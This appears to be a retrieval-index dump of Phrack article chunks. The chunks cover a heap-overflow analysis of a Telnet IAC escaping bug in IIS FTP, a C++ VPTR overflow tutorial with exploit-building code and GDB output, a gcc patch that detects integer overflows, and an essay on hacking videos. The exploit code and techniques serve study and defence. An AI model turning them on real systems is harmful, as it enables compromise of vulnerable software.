TELNET_STREAM_CONTEXT::OnSendData(DATA_STREAM_BUFFER *dsb) { char *begin = dsb->BufferBegin; char *start = dsb->BufferBegin; char *end = dsb->BufferEnd; int len = dsb->BufferLength; int iac_count = 0; if(begin + len == end) return 0; //do a total count of the IAC codes do { start++; if(*start == 0xFF) iac_count++; } while(start < end); if(!iac_count) return 0; for(char *c = begin; c != end; *begin++ = *c) { c++; if(*c == 0xFF) *begin++ == 0xFF; } return 0; } As you can see, if the function encounters a 0xFF that is NOT separated by at least 2-bytes then there is a potential to escape the code more than once, which will eventually lead to a heap corruption into adjacent memory based on the size of the request and amount of IAC codes. For example, if you were to send the string \"\\xFF\\xBB\\xFF\\xFF\\xFF\\xBB\\xFF\\xFF\" to the server, OnReceivedData produces the values: 1) Before OnReceivedData a. DSB->BufferLength = 8 b. DSB->Buffer = \"\\xFF\\xBB\\xFF\\xFF\\xFF\\xBB\\xFF\\xFF\" 2) After OnReceivedData a. DSB->BufferLength = 4 b. DSB->Buffer = \"\\xBB\\xFF\\xBB\\xFF\" Although OnReceivedData attempted to escape the IAC codes, it didn't expect to see multiple 0xFFs within a certain range; therefore writing the illegitimate values at an unacceptable range for OnSendData. Using the same string from above, OnSendData would write multiple 0xFF characters past the end of the buffer due to de-synchronization in the reading and writing into the same buffer. Now that it is known that a certain amount of 0xFF characters can be written past the end of the buffer, it is time to think about an exploitation strategy and gather primitives... --[ 4 - Exploitation Primitives Exploitation primitives can be thought of as the building blocks of exploit development. They can be as simple as program functionality that produces a desired result or as complicated as a 1-to-n byte overflow. The section will cover many of the primitives used within the exploit. In-depth knowledge of the underlying operating system usually proves to be invaluable information when writing exploits. This holds true for the IIS FTP exploit, as intricate knowledge of the Windows 7 Low Fragmentation Heap served as the basis for exploitation. It was decided that the FreeEntryOffset Overwrite Technique [2] would be used due to the limited ability of the attacker to control the contents of the overflow. The attack requires the exploiter to enable the low fragmentation heap, position a chunk under the exploiter's control before a free chunk (implied same size) within the same UserBlock, write at least 10 bytes past the end of its buffer, and finally make two subsequent requests that are serviced from the same UserBlock. [Yes, it's just that easy ;)] The following diagram shows how the FreeEntryOffset is utilized when making allocations. The first allocation comes from a virgin UserBlock, setting the FreeEntryOffset to the first two-byte value stored in the current free chunk. Notice there is no validation when updating the FreeEntryOffset. For MUCH more information on the LFH and exploitation techniques please see the references section: Allocation 1 FreeEntryOffset = 0x10 --------------------------------- |Header|0x10| Free | --------------------------------- |Header|0x20| Free | --------------------------------- |Header|0x30| Free | --------------------------------- Allocation 2 FreeEntryOffset = 0x20 --------------------------------- |Header| Used | --------------------------------- |Header|0x20| Free | --------------------------------- |Header|0x30| Free | --------------------------------- Allocation 3 FreeEntryOffset = 0x30 --------------------------------- |Header| Used | --------------------------------- |Header",
                      "hash": "3612dc9013fd73a537fc9dc12fe47eeca9eeee4950737edd0396c1bdd60b439d",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8208096623420715
                    }
                  ]
                },
                {
                  "created": 1679370780914,
                  "document_id": "phrack-56-8",
                  "timestamp": 947030400000,
                  "tags": ["phrack", "issue-56", "article-8"],
                  "hash": "5d8603583792eb54e3876e5d6001542be053ceea2c06a12019a5f3f0080f647a",
                  "text_size": 54865,
                  "chunk_count": 5,
                  "chunks": [
                    {
                      "text": " depends largely of the size of the buffer. A buffer of large size will be able to contain without problem a VTABLE and a shellcode, and then avoid all risks of segmentation faults. Let's remind ourselves that our objects are each time followed by a 4 bytes sequence (0x29, 0x49), and that we can without problems write our 00h (end of string) to the byte behind our VPTR. To check we are going to place our shellcode rightly before our VPTR. We are going to adopt the following structure in our buffer: +------(1)---<----------------+ | | | ==+= SSSS ..... SSSS .... B ... CVVVV0 ==+= =+== | | | | +----(2)--+->-------------+ Where: V represents bytes of the address of the beginning of our buffer. S represents bytes of the address of our shellcode, here the address of C (address S=address V+offset VPTR in the buffer-1 in this case, because we have placed our shellcode rightly before the VPTR). B represents the possible bytes of any value alignment (NOPs:), to align the value of our VPTR on the VPTR of the object. C represents the byte of the shellcode, in this case, a simple CCh byte (INT 3), that will provoke a SIGTRAP signal. 0 represents the 00h byte, that will be at the end of our buffer (for strcpy() function). The number of addresses to put in the beginning of our buffer (SSSS) depends if we know or not the index in the VTABLE of the 1st method that will be called after our overflow: Either we knows this index, and then we writes the corresponding pointer. Either we doesn't know this index, and we generate a maximum number of pointers. Then, we hope the method that will be executed will use one of those overwritten pointers. Notice that a class that contains 200 methods isn't very usual ;) The address to put in VVVV (our VPTR) depends principally of the execution of the program. It is necessary to note here that our objects were allocated on the heap, and that it is difficult to know exactly their addresses. We are going to write a small function that will construct us a buffer. This function will receive 3 parameters: - BufferAddress: the address of the beginning of the buffer that we will overflow. - NAddress: the number of addresses that we want in our VTABLE. Here is the code of our BufferOverflow() function: char *BufferOverflow(unsigned long BufferAddress,int NAddress,int VPTROffset) { char *Buffer; unsigned long *LongBuffer; unsigned long CCOffset; int i; Buffer=(char*)malloc(VPTROffset+4); // allocates the buffer. CCOffset=(unsigned long)VPTROffset-1; // calculates the offset of the code to execute in the buffer. for (i=0;i<VPTROffset;i++) Buffer[i]='\\x90'; // fills the buffer with 90h (NOP, old habit:))) LongBuffer=(unsigned long*)Buffer; // constructs a pointer to place addresses in our VTABLE. for (i=0;i<NAddress;i++) LongBuffer[i]=BufferAddress+CCOffset; // fills our VTABLE at the beginning of the buffer with the address of the // shellcode. LongBuffer=(unsigned long*)&Buffer[VPTROffset]; // constructs a pointeur on VPTR. *LongBuffer=BufferAddress; // value that will overwrite VPTR. Buffer[CCOffset]='\\xCC'; // our executable code. Buffer[VPTROffset+4]='\\x00'; // finishes by a 00h char (end string). return Buffer; } In our program we can now call our BufferOverflow() function, with as parameters: - the address of our buffer, here the address of our object (Object[0]). - 4 values in our VTABLE, in this case (since PrintBuffer() is in VTABLE+8+4). - 32 as offset for VPTR. Here is the resulting code (bo3.cpp): #include <stdio.h> #include <string.h> #include <malloc.h> class BaseClass { private: char Buffer[32]; public: void SetBuffer(char *String) { strcpy(Buffer,String); } virtual void PrintBuffer() { printf(\"%s\\n\",Buffer); } }; class MyClass1:public BaseClass { public: void PrintBuffer() { printf(\"MyClass1: \"); BaseClass::PrintBuffer(); } }; class MyClass2:public BaseClass { public: void PrintBuffer() { printf(\"MyClass2: \"); BaseClass::PrintBuffer(); } }; char *BufferOverflow(unsigned long BufferAddress,int NAddress,int VPTROffset) { char *Buffer; unsigned long *LongBuffer; unsigned long CCOffset; int i; Buffer=(char*)malloc(VPTROffset+4+1); CCOffset=(unsigned long)VPTROffset-1; for (i=0;i<VPTROffset;i++) Buffer[i]='\\x90'; LongBuffer=(unsigned long*)Buffer; for (i=0;i<NAddress;i++) LongBuffer[i]=BufferAddress+CCOffset; LongBuffer=(unsigned long*)&Buffer[VPTROffset]; *LongBuffer=BufferAddress; Buffer[CCOffset]='\\xCC'; Buffer[VPTROffset+4]='\\x00'; return Buffer; } void main() { BaseClass *Object[2]; Object[0]=new MyClass1; Object[1]=new MyClass2; Object[0]->SetBuffer(BufferOverflow((unsigned long)&(*Object[0]),4,32)); Object[1]->SetBuffer(\"string2\"); Object[0]->PrintBuffer(); Object[1]->PrintBuffer(); } We compile, and we launch GDB: rix@pentium:~/BO > gcc -o bo3 bo3.cpp rix@pentium:~/BO > gdb bo3 ... (gdb) disass main Dump of assembler code for function main: 0x8048670 <main>: pushl %ebp 0x8048671 <main+1>: movl %esp,%ebp 0x8048673 <main+3>: subl $0x8,%esp 0x8048676 <main+6>: pushl %edi 0x8048677 <main+7>: pushl %esi 0x8048678 <main+8>: pushl %ebx 0x8048679 <main+9>: pushl $0x24 0x804867b <main+11>: call 0x80488c0 <___builtin_new> 0x8048680 <main+16>: addl $0x4,%esp 0x8048683 <main+19>: movl %eax,%eax 0x8048685 <main+21>: pushl %eax 0x8048686 <main+22>: call 0x8048760 <__8MyClass1> 0x804868b <main+27>: addl $0x4,%esp 0x804868e <main+30>: movl %eax,%eax 0x8048690 <main+32>: movl %eax,0xfffffff8(%ebp) 0x8048693 <main+35>: pushl $0x24 0x8048695 <main+37>: call 0x80488c0 <___builtin_new> 0x804869a <main+42>: addl $0x4,%esp 0x804869d <main+45>: movl %eax,%eax 0x804869f <main+47>: pushl %eax 0x80486a0 <main+48>: call 0x8048730 <__8MyClass2> 0x80486a5 <main+53>: addl $0x4,%esp 0x80486a8 <main+56>: movl %eax,%eax ---Type <return> to continue, or q <return> to quit--- 0x80486aa <main+58>: movl %eax,0xfffffffc(%ebp) 0x80486ad <main+61>: pushl $0x20 0x80486af <main+63>: pushl $0x4 0x80486b1 <main+65>: movl 0xfffffff8(%ebp),%eax 0x80486b4 <main+68>: pushl %eax 0x80486b5 <main+69>: call 0x80485b0 <BufferOverflow__FUlii> 0x80486ba <main+74>: addl $0xc,%esp 0x80486bd <main+77>: movl %eax,%eax 0x80486bf <main+79>: pushl %eax 0x80486c0 <main+80>: movl 0xfffffff8(%ebp),%eax 0x80486c3 <main+83>: pushl %eax 0x80486c4 <main+84>: call 0x8048790 <SetBuffer__9BaseClassPc> 0x80486c9 <main+89>: addl $0x8,%esp 0x80486cc <main+92>: pushl $0x80489f6 0x80486d1 <main+97>: movl 0xfffffffc(%ebp),%eax 0x80486d4 <main+100>: pushl %eax 0x80486d5 <main+101>: call 0x8048790 <SetBuffer__9BaseClassPc> 0x80486da <main+106>: addl $0x8,%esp 0x80486dd <main+109>: movl 0xfffffff8(%ebp),%eax 0x80486e0 <main+112>: movl 0x20(%eax),%ebx 0x80486e3 <main+115>: addl $0x8,%ebx 0x80486e6 <main+118>: movswl (%ebx),%eax 0x80486e9 <main+121>: movl %eax,%edx 0x80486eb <main+123>: addl 0xfffffff8(%ebp),%edx ---Type <return> to continue, or q <return> to quit--- 0x80486ee <main+126>: pushl %edx 0x80486ef <main+127>: movl 0x4(%ebx),%edi 0x80486f2 <main+130>: call *%edi 0x80486f4 <main+132>: addl $0x4,%esp 0x80486f7 <main+135>: movl 0xfffffffc(%ebp),%eax 0x80486fa <main+138>: movl 0x20(%eax),%esi 0x80486fd <main+141>: addl $0x8,%esi 0x8048700 <main+144>: movswl (%esi),%eax 0x8048703 <main+147>: movl %eax,%edx 0x8048705 <main+149>: addl 0xfffffffc(%ebp),%edx 0x8048708 <main+152>: pushl %edx 0x8048709 <main+153>: movl 0x4(%esi),%edi 0x804870c <main+156>: call *%edi 0x804870e <main+158>: addl $0x4,%esp 0x8048711 <main+161>: xorl %eax,%eax 0x8048713 <main+163>: jmp 0x8048720 <main+176> 0x8048715 <main+165>: leal 0x0(%esi,1),%esi 0x8048719 <main+169>: leal 0x0(%edi,1),%edi 0x8048720 <main+176>: leal 0xffffffec(%ebp),%esp 0x8048723 <main+179>: popl %ebx 0x8048724 <main+180>: popl %esi 0x8048725 <main+181>: popl %edi 0x8048726 <main+182>: movl %ebp,%esp 0x8048728 <main+184>: popl %ebp ---Type <return> to continue, or q <return> to quit--- 0x8048729 <main+185>: ret 0x804872a <main+186>: leal 0x0(%esi),%esi End of assembler dump. Next, we install a breakpoint in 0x8048690, to get the address of our 1st object. (gdb) break *0x8048690 Breakpoint 1 at 0x8048690 And finally, we launch our program: (gdb) run Starting program: /home/rix/BO/bo3 Breakpoint 1, 0x8048690 in main () We read the address of our 1st object: (gdb) info reg eax eax: 0x8049b38 134519608 Then we pursue, while hoping that all happens as foreseen... :) Continuing. Program received signal SIGTRAP, Trace/breakpoint trap. 0x8049b58 in ?? () We receive a SIGTRAP well, provoked by the instruction preceding the 0x8049b58 address. However, the address of our object was 0x8049b38. 0x8049b58-1-0x8049b38=0x1F (=31), which is exactly the offset of our CCh in our buffer. Therefore, it is well our CCh that has been executed!!! You understood it, we can now replace our simple CCh code, by a small shellcode, to get some more interesting results, especially if our program bo3 is suid... ;) Some variations about the method ================================ We have explain here the simplest exploitable mechanism. Other more complex cases could possibly appear... For example, we could have associations between classes like this: class MyClass3 { private: char Buffer3[32]; MyClass1 *PtrObjectClass; public: virtual void Function1() { ... PtrObjectClass1->PrintBuffer();",
                      "hash": "00ed2be6299a55953f92870ffb227af786fc8c3f87ba74860c17138280cc774e",
                      "offset": 2,
                      "vector": null,
                      "score": 0.8172733783721924
                    }
                  ]
                },
                {
                  "created": 1679370877212,
                  "document_id": "phrack-60-9",
                  "timestamp": 1041033600000,
                  "tags": ["phrack", "issue-60", "article-9"],
                  "hash": "5ffce4d19e2513c7d2d2b6531720640fef20e12213320ae732ca4c9c0c0efc42",
                  "text_size": 58337,
                  "chunk_count": 5,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x3c, Phile #0x09 of 0x10 |=-------------------=[ Big Loop Integer Protection]=------------------=| |=---------------------------------------------------------------------=| |=--------------=[ Oded Horovitz ohorovitz@entercept.com ]=------------=| --[ Contents 1 - Introduction 2 - Part I - Integer problems 2.1 - Introduction 2.2 - Basic code samples 3 - Part II - Exploitation pattern 3.1 - One input, two interpretations 3.2 - What is the nature of the input? 3.3 - Suggested detection 4 - Part III - Implementation 4.1 - Introduction 4.2 - Why gcc? 4.3 - A bit about gcc 4.3.1 - Compilation flow 4.3.2 - The AST 4.3.3 - Getting started 4.4 - Patch Goals 4.5 - Patch overview 4.5.1 - Tactics 4.5.2 - Modifying the AST 4.6 - Limitations 5 - References 6 - Thanks 7 - Appendix A - Real life examples 7.1 - Apache Chunked encoding 7.2 - OpenSSH auth 8 - Appendix B - Using blip --[ 1 - Introduction Integer overflow and integer sign vulnerabilities are now common knowledge. This has led to increased exploitation of integer-related vulnerabilities. The article will attempt to suggest a way to detect these vulnerabilities by adding compiler support that detects and flags integer vulnerabilities exploitations. Specifically a gcc patch is presented to demonstrate the feasibility of this technique. The article is divided into three parts. Part one contains a brief introduction to some of the common integer related vulnerabilities. We list some of the recent public vulnerabilities. Part two of the article tries to explain the root cause of the problem with integer vulnerabilities. Using real examples, the article explains why exploitation is possible in the first place, and how it may be possible to detect exploitation of integer vulnerabilities, even when the vulnerability is not known in advance. Part three goes through the implementation of the suggested detection scheme. Since the implementation of this detection scheme is in the form of a gcc patch, introduction information about gcc internals is provided as well. We summarize the paper by demonstrating the protection at work against OpenSSH and the Apache httpd packages. --[ 2 - Part I - Integer problems ----[ 2.1 - Introduction In the last year the attention seems to have shifted to a new bad programming practice. This practice is related to the possibility to integer overflows that cause buffer overflows. It turns out the many popular and (assumed to be) secure software packages (OpenSSH, Apache, *BSD kernel) share this vulnerability. The root cause for this bad practice is insufficient input validation for integer type input. Integer input looks so naive, only a few bits long. What can go wrong here? Well, it seems that quite a lot can go wrong. The following is a table of integer related vulnerabilities taken from the OpenBSD and FreeBSD security lists. All vulnerabilities have been reported during year 2002. ------------------------------------------------------------------------- | Vulnerable package | Short description of vulnerability | ------------------------------------------------------------------------- | OpenBSD select syscall | Positive limit checks against int value | | (See reference [4]) | allowing stack overflow | ------------------------------------------------------------------------- | RPC xdr_array | Int overflow cause small buffer allocation | | | which later overflowed with input | ------------------------------------------------------------------------- | OpenSSH Authentication | Int overflow cause small buffer allocation | | | which later overflowed with input | ------------------------------------------------------------------------- | Apache chunked-encoding| Positive condition is done on signed int | | | allowing heap overflow | ------------------------------------------------------------------------- | FreeBSD get_pallette | Positive condition is done on signed int | | | allowing information leak from kernel to user| ------------------------------------------------------------------------- | FreeBSD accept1,getsoc-| Positive condition is done on signed int | | kname1,getpeername1 | allowing information leak from kernel to user| ------------------------------------------------------------------------- Table 1 - Sample integer vulnerabilities in year 2002. The common problem that exists in all of the above vulnerabilities is that an input of integer type (signed and unsigned) was used to trigger overflow (when writing) or info leak (when reading) to/from program buffers. All of the above vulnerabilities would have been prevented if proper limits had been enforced. ----[ 2.2 - Basic code samples Integer vulnerabilities can be further illustrated by looking at the following two simple code samples. Example 1 (int overflow): ------------------------- 01 int main(int argc,char* argv[]){ 02 unsigned int len,i; 03 char *buf; 04 if(argc != 3) return -1; 05 len=atoi(argv[1]); 06 buf = (char*)malloc(len+1); 07 if(!buf){ 08 printf(\"Allocation faild\\n\"); 09 return -1; 10 } 11 for(i=0; i < len; i++){ 12 buf[i] = _toupper(argv[2][i]); 13 } 14 buf[i]=0; 15 printf(\"%s\\n\",buf); 16 } The code above seems quite legit. The program converts a string to its upper case representation. First it allocates enough space for the string and the NULL termination character. Then it converts each character into its upcase value. But when looking a bit closer, we can identify two major problems in the code. First, the program trusts the user to have as much characters as he specifies (which is obviously not the case)(line 5). Second, the program doesn't take into account that by calculating the space to allocate, an integer overflow may occur (line 6). Trying to generalize the problem, the first bug may allow the attacker to read information, which he didn't provide (by trusting the user input and reading *len* chars from argv[2]). The second bug allows the attack to overflow the heap with its own data, and therefore to fully compromise the program. Example 2 (sign check-bypass): ------------------------------ 01 #define BUF_SIZE 10 02 int max = BUF_SIZE; 03 int main(int argc,char* argv[]){ 04 int len; 05 char buf[BUF_SIZE]; 06 if(argc != 3) return -1; 07 len=atoi(argv[1]); 08 if(len < max){ 09 memcpy(buf,argv[2],len); 10 printf(\"Data copied\\n\"); 11 } 12 else 13 printf(\"Too much data\\n\"); 14 } The second example shows a program that had the intention to solve the problem introduced in the first example, by attempting to enforce user input length to a known and predefined maximum value. The problem in this code is that len is defined as a signed int. In this case a very big value (unsigned wise) is interpreted as a negative value (line 8), which will bypass the limit check. Still, in line 9 the same value is interpreted as an unsigned positive number causing a buffer overflow and possibly allowing a full compromise. --[ 3 - Part II - Exploitation pattern ----[ 3.1 - One input, two interpretations So what is the real problem? How come such security-oriented packages have these vulnerabilities? The answer is that integer inputs sometimes have an ambiguous interpretation at different parts of the code (integer may change their sign at different values, implicit type cast, integer overflows). That ambiguous interpretation is hard to notice when implementing input validation code. To explain this ambiguity let us look at the first example. At the time of allocation (line 6), the code believes that since the input is a number, then adding another number will yield a bigger number (len+1). But since typical C language programs ignore integer overflows the particular number 0xffffffff do not apply to this assumption and yields unexpected result (zero). Unfortunately the same error is *NOT* repeated later in the code. Therefore the same input 0xffffffff this time interpreted as an unsigned value (a huge positive number). In the second example the ambiguity of the input is even more obvious. Here the code includes a silent type casting generated by the compiler when calling memcpy. The code therefore is checking the value of the input as if it was a signed number (line 8) while using it to copy data as if it was an unsigned (line 9). This ambiguity is invisible for the coder eye, and may go undetected, leaving the code vulnerable to this \"stealthy\" attack. ----[ 3.2 - What is the nature of the input? Looking back at the above examples reveal a common meaning for the attacker input. (Sorry if the next few lines will explain the obvious :>) The above input is a number for a reason. It is a counter! It counts items! It doesn't matter what those \"items\" are (bytes, chars, objects, files, etc.). They are still countable amount of items. And what can you do with such a counter? Well, you are most likely to do some processing \"count\" amount of times. As a note I will say that not *every* number is also a counter. There are many other reasons to have numbers around. But the one that are related to integer vulnerabilities happend to be \"counters\" most of the time. For example, if the count is for challenge response you may want to read \"count\" amount of responses (OpenSSH). Or if the count is buffer length you may want to copy \"count\" amount of bytes from one memory location to the other (Apache httpd). The bottom line is that somewhere behind this number there is the proper \"loop\" in the code that will do some processing, \"count\" number of times. This \"loop\" may have multiple forms such as the for-loop in the first example, or as an implicit loop in memcpy. Still all loop flavors will end up looping around the \"count\". ----[ 3.3 - Suggested detection Ok, what do we have so far about those vulnerabilities? - The input was ambiguously used in the code. - Somewhere in the code there is a loop that uses the input integer as an iteration counter. To make the interpretation of the number ambiguous, the attacker has to send a huge number. Looking at the first example we can see that in order to make the number ambiguous the attacker needed to send such a big number that if doing (len+1) the number will overflow. For that to happen the attacker will have to send the value 0xffffffff. Looking at the second example, in order to make the interpretation of the number ambiguous, the attacker needs to send such a number that will fall into the negative range of an integer 0x80000000-0xffffffff. The same huge number sent by the attacker to trigger the vulnerability is later used in a loop as the iterations counter (As discussed in the section \"What is the nature of the input?\") Now lets analyze the exploit process: 1. Attacker wants to overflow buffer. 2. Attacker may use integer vulnerability 3. Attacker sends a huge integer to trigger the vulnerability. 4. Count loop executes (probably) using attacker input as the loop bound. 5. A Buffer is overflowed (On early iterations of the loop!) Therefore detecting (and preventing) integer vulnerability exploitation is possible by validating the loop bounds before its execution. The validation of the loop will check that the loop limit is not above a predefined threshold, and if the limit is higher that the threshold a special handler will be triggered to handle the possible exploitation. Since the value required to trigger most integer vulnerabilities is huge, we can assume (hope) that most legitimate loops will not trigger this protection. To get a feeling for what values we expect to see in integer Vulnerabilities, lets examine the following samples: - Allocating buffer for user data + program data Looks like: buf = malloc(len + sizeof(header)); In this case the value required for triggering int overflow is very close to 0xffffffff since most program struct sizes are in the range of several bytes to hundreds bytes at most. - Allocating arrays looks like: buf = malloc(len * sizeof(object)); In this case the value required for triggering the overflow may be much smaller then in the first example but it is still a relatively huge value. For example if sizeof(object) == 4 then the value should be bigger then 0x40000000 (one Giga). Even if the sizeof(object)== 64 the value should be bigger then 0x4000000 (64 Mega) in order to cause an overflow. - Falling to negative range In this case the value required to make a number negative is any number bigger then 0x7fffffff. Looking at the values required to trigger the integer vulnerability, we can choose a threshold such as 0x40000000 (One Giga) that will handle most cases. Or we can select smaller threshold for better protection, which may trigger some false positives. --[ 4 - Part III - Implementation ----[ 4.1 - Introduction Once we have a suggested a way to detect integer attacks, it will be nice to implement a system based on that idea. A possible candidate for implementing this system is to extend an existing compiler. Since the compiler knows about all loops in the application, it will be possible for the compiler to add the appropriate security checks before any \"count loop\". Doing so will secure the application without any knowledge of the specific vulnerability. Therefore I choose to implement this system as a gcc patch and name it \"Big Loop Integer Protection\" a.k.a blip. Using the -fblip flag one may now be able to protect his application from the next yet to be public integer exploit. ----[ 4.2 - Why gcc? Choosing gcc was not a tough decision. First this compiler is one of the most common compilers in the Linux, *nix world. Therefore, patching gcc will allow protecting all applications compiled with gcc. Second, the gcc is open-source therefore it may be feasible to implement this patch in the first place. Third, previous security patches were implemented as gcc patches (StackGaurd, ProPolice).So why not follow their wisdom? ----[ 4.3 - A bit about gcc Well.., all happy I set down knowing that I'm about to make a gcc patch for preventing integer attacks. But, except of that, what do I really know about gcc at all? I must admit that the answer for that question was - \"not much\". To overcome this little problem, I was looking for some documentation about gcc internals. I also hoped to find something similar to what I wanted to do, which already exists. Fast enough, it was clear that before jumping to other examples, I must understand the gcc beast. .. Two weeks later, I have read enough of the gcc internal documentation, and I spent enough time in debugging sessions of the compiler, to be able to",
                      "hash": "7dbfbb20efdf2183a14f298d814ba428f941b6cdccf32c932376cf04ee32cb7f",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8165990710258484
                    }
                  ]
                },
                {
                  "created": 1679371189332,
                  "document_id": "phrack-70-15",
                  "timestamp": 1633392000000,
                  "tags": ["phrack", "issue-70", "article-15"],
                  "hash": "4caab1c3db0e2732f2cd7d94702e46cd53dd78857999d48445229cd5ebf73893",
                  "text_size": 19122,
                  "chunk_count": 2,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x10, Issue 0x46, Phile #0x0f of 0x0f |=-----------------------------------------------------------------------=| |=---------------------=[ YouTube Security Scene ]=----------------------=| |=-----------------------------------------------------------------------=| |=--------------------------=[ LiveOverflow ]=---------------------------=| |=-----------------------------------------------------------------------=| --[ Table of Contents 0. About the Author 1. Preamble 2. Before 2014 3. My Start in 2015 4. Today's Scene 5. Final Words 6. References --[ 0. About the Author To briefly introduce myself, I'm LiveOverflow and I make videos about various IT security topics. Here are a few: + How SUDO on Linux was HACKED! // CVE-2021-3156 https://youtu.be/TLa2VqcGGEQ?list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx + XSS on Google Search - Sanitizing HTML in The Client? https://www.youtube.com/watch?v=lG7U3fuNw3A + Identify Bootloader main() and find Button Press Handler https://youtu.be/yJbnsMKkRUs?list=PLhixgUqwRTjyLgF4x-ZLVFL-CRTCrUo03 --[ 1. Preamble From BBS and text files, over IRC and books, to the modern internet with forums and blogs, hackers exchanged information primarily in text form. This of course meant, most older hackers prefer text, which makes it difficult to establish new kinds of media. When I started producing videos in 2015 I often got the feedback that text is superior, nobody will watch videos and I should instead write articles. So when I was asked to write about the \"YouTube Hacking Scene\" for Phrack I felt like video production finally reached some level of acceptance. While this article is titled \"YouTube Hacking Scene\" I also want to include streamers on Twitch and other platforms - who knows how long the product YouTube will survive, and I'm sure Phrack will exist long after. Given that my personal experience is biased and the history is difficult to research, this article is certainly not objective. So we will go with the French saying \"preach the falsehood to know the truth\". So if you know it better, please reach out. --[ 2. Before 2014 Digging up information about hacking videos from the early 2000s is difficult, but it's clear that it was not very popular. Personally I remember \"Lenas Reversing for Newbies\"[0] video series from 2006 very well, but it wasn't distributed via YouTube. It is an incredibly detailed and hands-on walkthrough of Windows reverse engineering and cracking with OllyDbg. I have seen it getting recommended a lot over years, indicating that there is a craving for the visual teaching approach. One of the earliest hacking show attempts seems to be \"the broken\" by Kevin Rose from 2003[1]. Then in 2005 Darren Kitchen started the Hak5 show[2] and it deserves a mention, as it is probably the longest running hacking video production. YouTube already existed when it started, but it wasn't popular just yet, so the distribution heavily relied on torrents. Notable might also be IronGeek, who started uploading conference videos on YouTube in 2007. His trip to Notacon 2007 might be the first ever \"Hacking Vlog\"[3]. But all of these video projects were mostly just scratching the surface of hacking. Very few videos were actually digging into the technical details. In 2007 the project SecurityTube started out of India by vivekramac. Probably inspired by YouTube it was meant as a place for everybody to upload and share hacking video content, but vivekramac himself was responsible for creating tons of videos. For many years it seems to have been the best source for free video courses. But in 2011 the site slowly transitioned into the new paid courses platform Pentester Academy. Fun fact, when I started making videos in 2015 I obviously came across SecurityTube and I tried to submit my videos there, but they were never accepted. The platform already felt abandoned, and the content was kinda outdated and not the depth I was looking for anyway. Nonetheless a very important part of video creator history. Over the years I have been collecting YouTube channels with more or less technical security content. And to create the chart below (Fig. 1), I looked at the year of their first relevant upload. Also most of those channels only have a handful of videos and were abandoned shortly after. But in hindsight I even noticed there were a few very early attempts at making more technical video walkthroughs such as lordparody (2009)[4]. Looking at the data there appears to have been a small surge after 2010, but I think that 2015 was where the current hacker creator scene really started growing. 2005: * 2006: 2007: ** 2008: * 2009: ***** 2010: **** 2011: ******* 2012: ************ 2013: ********* 2014: ****** 2015: *************** 2016: ************************** 2017: **************************** 2018: ********************* 2019: ************ 2020: ********************* Fig 1. Bar chart showing the numbers of new hacking YouTube creators by year --[ 3. My Start in 2015 Around 2014 I started to hit a wall in my own learning progress. There were tons of (written) tutorials about web security, WiFi hacking, Metasploit and buffer overflows, but the material mostly covered basics. To actually learn more advanced topics I had to play wargames[6] and CTFs. I remember fondly struggling for months playing w3challs or io.smashthestack to improve very very slowly - I was a classic annoying noob, even getting banned by bla from IRC ;) I believe it shouldn't have been this difficult to progress. In the traditional academic science community you rely on papers, to build upon prior research. And while we have equivalent resources, see for example Phrack, we are missing the educational institutions like universities to pass on this knowledge more effectively. So in the past, new people had to walk a very stony path to catch up with the state-of-the-art. After I finally \"understood\" ret2libc and ROP, I felt like that this stuff is actually easy, but the existing material is just bad at explaining it. Then in late 2014, early 2015, two events happened that would have a big impact on me. The first event was the growing community of programmers on reddit called /r/WatchPeopleCode[7] - a subreddit about live streaming programming. While it is not about security, everybody knows that programming skills are crucial if you do any form of more in-depth hacking. The second event was geohot livestreaming himself solving pwnable challenges from overthewire.org[8]. What both of these events have in common is that it's the first time for me looking over the shoulder of a professional. I realized that all the talks, blog posts and articles only cover the results, and rarely the actual process. And because I was not lucky enough to have people around me to learn from in person, watching over the shoulder of an experienced developer, or geohot, was eye opening. To see how geohot was using the terminal, writing exploit scripts and navigating IDA Pro was incredibly insightful. But more importantly, it also exposed the fails and mistakes followed by the process of troubleshooting and fixing the bugs. And this pushed me through the wall I was hitting in my own education. I was craving more. Where can I find more streams or videos where people are hacking? Unfortunately, when searching on YouTube, the only videos I could find were either Metasploit tutorials or how to use aircrack-ng to hack a WiFi. And these topics were very boring to me as I was more interested in the process of finding these kinds of flaws, rather than just using what others found. Of course I was very far away from geohot's skills, I did understand ROP and I thought I could create the \"over the shoulder\" experience for the people coming after me. Which led me to start livestreaming pwnable challenges[9] from exploit-exercises.com (today exploit.education), and cover other CTFs. However I quickly noticed that I was terrible at streaming and soon transitioned into making scripted videos with a focus on visual explanations[10]. Another realization I had was, in fact, I did not understand ROP and other topics properly. So having the aspiration to create better tutorials, it forced me to dig deeper, which meant this project benefited my own education too. Of course this is me talking from my own perspective and I don't want to make it sound like I was the only one. I simply wanted to provide insight on what motivations can lead people to create videos. So at this point I would like to mention a few other folks who were making videos about more \"advanced\" topics around that time. Gynvael from the Dragon Sector CTF team[11], MurmusCTF[12], ipp[13], psifertex[14], Zeta Two[15] and probably many more I unfortunately never came across. Making good videos is very time consuming, especially once it's more than \"just\" a screen recording or livestream. So very few creators are able to do it over a longer period of time and I believe John Hammond[16] and I have the longest and consistently running release schedule. --[ 4. Today's Scene As has been the case with any area of hacking, commercialization also creeps into this scene. I'm not immune to this either, as the time investment is massive and has to be justified somehow. This unfortunately leads to videos that are sometimes more motivated by exposure or products, rather than the pure sharing of knowledge; and it's difficult to find a balance between those opposing forces. It also led to the prior generation of free video content (SecurityTube, Cybrary, ...) to put their content behind paywalls. But there is one amazing positive commercial development that I want to highlight. In the past years companies like Google have sponsored very technical videos[17] to share insights into vulnerabilities of their own products. Who would have thought this could ever happen, when this community used to be scared to get sued for anything. There are also new problems that come with Google/YouTube and the other large social media platforms. YouTube for example has a policy against certain kinds of hacking videos[18], which lead to the take down of several videos and even entire channels. However it should also be noted 99% of the time it was a clear mistake and the decisions got reversed. \"Hacking: Demonstrating how to use computers or information technology with the intent to steal credentials, compromise personal data or cause serious harm to others such as (but not limited to) hacking into social media accounts.\" - YouTube's harmful or dangerous content policies Can hacking videos be ethical or unethical? It's a difficult topic and one that I clash a lot on with other creators. I do believe that there is a way to make the \"right\" kind of tutorials - and so far I haven't had any issues with YouTube ;) For example, I understand that Google does not want a step-by-step video guide 